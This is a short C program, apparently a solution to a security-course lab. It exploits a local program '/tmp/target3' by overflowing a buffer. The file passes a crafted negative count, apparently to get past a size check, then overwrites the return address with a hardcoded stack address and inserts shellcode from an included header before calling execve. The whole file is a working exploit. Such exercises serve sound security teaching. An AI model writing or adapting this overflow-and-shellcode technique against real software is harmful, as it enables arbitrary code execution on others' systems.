#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  // pass the function -1001
  char buf[20020] = "-2147482647,";

  // pad the buffer
  for (int i = 12; i < 20020; i++)
    buf[i] = 'a'; 

  // overflow return address
  int *return_address = (int *)(buf + 20016);
  *return_address = 0xbfffafb8;

  // insert shellcode
  memcpy(buf + 19945, shellcode, sizeof(shellcode) - 1);

  char *args[] = { TARGET, buf, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
